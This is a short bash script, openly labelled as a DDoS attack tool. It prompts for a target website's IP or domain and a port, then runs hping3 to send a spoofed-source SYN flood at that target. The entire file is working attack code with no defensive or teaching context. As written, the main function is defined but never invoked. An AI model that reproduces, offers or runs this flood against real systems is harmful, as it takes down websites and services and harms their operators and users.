#!/bin/bash

# Function to get user input
get_user_input() {
  read -p "Enter the target website's IP address or domain name: " TARGET_IP
  read -p "Enter the target port (default is 80): " TARGET_PORT
  TARGET_PORT=${TARGET_PORT:-80}
}

# Function to perform the DDoS attack
ddos_attack() {
  sudo hping3 $TARGET_IP --flood --rand-source --destport $TARGET_PORT --syn
}

# Main function
main() {
  get_user_input
  echo "Starting DDoS attack on $TARGET_IP:$TARGET_PORT. Press Ctrl+C to stop."
  ddos_attack
}
